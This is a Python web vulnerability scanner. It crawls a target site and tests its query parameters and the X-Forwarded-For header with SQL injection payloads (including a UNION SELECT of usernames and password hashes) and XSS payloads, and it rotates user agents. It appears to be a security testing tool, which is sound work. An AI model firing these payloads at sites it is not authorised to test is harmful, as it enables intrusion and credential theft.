import os
import random
import re
import time
import uuid
from html import escape
from urllib.parse import parse_qs, urlencode, urljoin, urlparse, urlunparse

import requests

SQLI_PAYLOADS = [
    "' OR '1'='1 --",
    "' OR 1=1#",
    """' UNION SELECT NULL--""",
    """' UNION SELECT username, password_hash FROM users--""",
    """1); WAITFOR DELAY '0:0:3';--""",
]
XSS_PAYLOADS = [
    "<script>alert(1)</script>",
    '" onmouseover="alert(1)" x="',
    "<img src=x onerror=alert(1)>",
]
SQL_ERROR_SIGNS = [
    "you have an error in your sql syntax",
    "warning: mysql",
    "unclosed quotation mark after the character string",
    "quoted string not properly terminated",
    "psql: error",
    "sqlite error",
    "sqlstate",
]
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/121",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/120",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Safari/605.1.15",
]


class ScanEvidence(dict):
    pass


def is_valid_url(url: str) -> bool:
    parsed = urlparse(url)
    return parsed.scheme in {"http", "https"} and bool(parsed.netloc)


def _with_payload(url: str, payload: str, param: str = "vuln") -> str:
    parsed = urlparse(url)
    query = parse_qs(parsed.query)
    query[param] = payload
    encoded_query = urlencode(query, doseq=True)
    new_parsed = parsed._replace(query=encoded_query)
    return urlunparse(new_parsed)


def _has_sql_error(body: str) -> bool:
    body_lower = body.lower()
    return any(sig in body_lower for sig in SQL_ERROR_SIGNS)


def _has_reflected(body: str, payload: str) -> bool:
    lower = body.lower()
    return payload.lower() in lower or escape(payload).lower() in lower


def _extract_links(html: str, base_url: str, same_host: str, limit: int = 5) -> list[str]:
    links = set()
    for match in re.findall(r'href="([^\"]+)"', html, flags=re.IGNORECASE):
        if match.startswith("javascript:"):
            continue
        joined = urljoin(base_url, match)
        parsed = urlparse(joined)
        if parsed.netloc.split(":")[0].lower() != same_host:
            continue
        links.add(urlunparse(parsed._replace(fragment="")))
        if len(links) >= limit:
            break
    return list(links)


def _save_snippet(folder: str | None, prefix: str, content: str) -> str | None:
    if not folder:
        return None
    try:
        os.makedirs(folder, exist_ok=True)
        fname = f"{prefix}_{uuid.uuid4().hex}.txt"
        path = os.path.join(folder, fname)
        with open(path, "w", encoding="utf-8", errors="ignore") as f:
            f.write(content[:8000])
        return path
    except OSError:
        return None


def _request(session: requests.Session, url: str, timeout: int, headers: dict | None = None, max_retries: int = 2):
    headers = headers or {}
    last_err = None
    for attempt in range(max_retries + 1):
        try:
            start = time.perf_counter()
            resp = session.get(url, timeout=timeout, verify=True, allow_redirects=True, headers=headers)
            elapsed = time.perf_counter() - start
            if resp.status_code in (429, 503) and attempt < max_retries:
                time.sleep(min(1.5 * (attempt + 1), 3.0))
                continue
            return resp, elapsed, None
        except requests.RequestException as exc:
            last_err = str(exc)
            if attempt < max_retries:
                time.sleep(0.5 * (attempt + 1))
                continue
            return None, 0.0, last_err
    return None, 0.0, last_err


def _dom_xss_check(target_url: str, payloads: list[str], timeout: int, evidence_list: list, messages: list, evidence_folder: str | None):
    try:
        from playwright.sync_api import sync_playwright
    except Exception:
        messages.append("DOM XSS scan skipped (playwright not installed).")
        return

    try:
        with sync_playwright() as p:
            browser = p.chromium.launch(headless=True)
            page = browser.new_page()
            for payload in payloads:
                test_url = _with_payload(target_url, payload)
                hit = {"fired": False, "msg": ""}

                def on_dialog(dialog):
                    hit["fired"] = True
                    hit["msg"] = dialog.message
                    dialog.dismiss()

                page.on("dialog", on_dialog)
                try:
                    page.goto(test_url, timeout=timeout * 1000)
                    content = page.content()
                    if hit["fired"] or payload.lower() in content.lower():
                        snippet_path = _save_snippet(evidence_folder, "xss_dom", content)
                        evidence_list.append(ScanEvidence(type="xss-dom", payload=payload, url=test_url, snippet=content[:200], snippet_path=snippet_path))
                except Exception as exc:
                    messages.append(f"DOM XSS check error: {exc}")
                finally:
                    page.remove_listener("dialog", on_dialog)
            browser.close()
    except Exception as exc:
        messages.append(f"DOM XSS scan failed to start: {exc}")


def run_scan(
    target_url: str,
    timeout: int = 8,
    allowed_hosts=None,
    crawl: bool = True,
    use_dom: bool = True,
    cookies: dict | None = None,
    extra_headers: dict | None = None,
    evidence_folder: str | None = None,
) -> dict:
    if not is_valid_url(target_url):
        raise ValueError("Invalid URL provided")
    if allowed_hosts:
        host = urlparse(target_url).netloc.split(":")[0].lower()
        if host not in {h.lower() for h in allowed_hosts}:
            raise ValueError("Target host not in allowed scope")

    session = requests.Session()
    session.headers.update({"User-Agent": random.choice(USER_AGENTS)})
    if extra_headers:
        session.headers.update(extra_headers)
    if cookies:
        session.cookies.update(cookies)

    results = {
        "sqli": False,
        "xss": False,
        "severity": "Low",
        "messages": [],
        "evidence": [],
    }

    # Baseline request
    base_resp, base_elapsed, base_err = _request(session, target_url, timeout)
    baseline_ms = int(base_elapsed * 1000)
    if base_err:
        results["messages"].append(f"Baseline request failed: {base_err}")

    targets = [target_url]
    if crawl and base_resp is not None:
        same_host = urlparse(target_url).netloc.split(":")[0].lower()
        extra = _extract_links(base_resp.text, target_url, same_host, limit=5)
        targets += [u for u in extra if u not in targets]
        if extra:
            results["messages"].append(f"Crawled {len(extra)} same-host link(s)")

    for url in targets:
        parsed = urlparse(url)
        params = parse_qs(parsed.query)
        param_names = list(params.keys()) or ["vuln"]

        for param in param_names:
            for payload in SQLI_PAYLOADS:
                test_url = _with_payload(url, payload, param=param)
                resp, elapsed, err = _request(session, test_url, timeout)
                body = resp.text if resp else ""
                status = resp.status_code if resp else None
                if err:
                    results["messages"].append(f"SQLi check error ({param}): {err}")
                    continue
                if _has_sql_error(body):
                    results["sqli"] = True
                    results["evidence"].append(ScanEvidence(type="sqli-error", param=param, payload=payload, url=test_url, status_code=status, snippet=body[:200], snippet_path=_save_snippet(evidence_folder, "sqli", body)))
                if baseline_ms and (elapsed * 1000) - baseline_ms > 2000:
                    results["sqli"] = True
                    results["messages"].append(f"Time anomaly on {param}")
                    results["evidence"].append(ScanEvidence(type="sqli-time", param=param, payload=payload, url=test_url, elapsed_ms=int(elapsed * 1000)))

        for param in param_names:
            for payload in XSS_PAYLOADS:
                test_url = _with_payload(url, payload, param=param)
                resp, elapsed, err = _request(session, test_url, timeout)
                body = resp.text if resp else ""
                status = resp.status_code if resp else None
                if err:
                    results["messages"].append(f"XSS check error ({param}): {err}")
                    continue
                if _has_reflected(body, payload):
                    results["xss"] = True
                    results["evidence"].append(ScanEvidence(type="xss-reflect", param=param, payload=payload, url=test_url, status_code=status, snippet=body[:200], snippet_path=_save_snippet(evidence_folder, "xss", body)))

                headers = {"X-Forwarded-For": payload}
                resp_h, elapsed_h, err_h = _request(session, url, timeout, headers=headers)
                if not err_h and resp_h is not None and _has_reflected(resp_h.text, payload):
                    results["xss"] = True
                    results["evidence"].append(ScanEvidence(type="xss-header", header="X-Forwarded-For", payload=payload, url=url, status_code=resp_h.status_code, snippet=resp_h.text[:200], snippet_path=_save_snippet(evidence_folder, "xss_hdr", resp_h.text)))

    if use_dom:
        _dom_xss_check(target_url, XSS_PAYLOADS[:2], timeout, results["evidence"], results["messages"], evidence_folder)

    if results["sqli"] and results["xss"]:
        results["severity"] = "High"
    elif results["sqli"] or results["xss"]:
        results["severity"] = "Medium"

    if not results["messages"]:
        results["messages"].append(f"Baseline response time: {baseline_ms} ms")

    return results
